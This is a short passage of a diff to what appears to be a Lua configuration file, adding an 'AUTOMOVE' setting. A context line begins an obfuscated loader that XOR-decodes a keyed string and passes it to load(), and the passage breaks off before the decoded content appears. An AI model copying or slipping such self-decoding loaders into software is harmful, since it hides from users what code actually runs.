@@ -1,4 +1,5 @@
 CONFIG = CONFIG
+CONFIG.AUTOMOVE = true
 
 
 local a = [[key="passwd2"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;
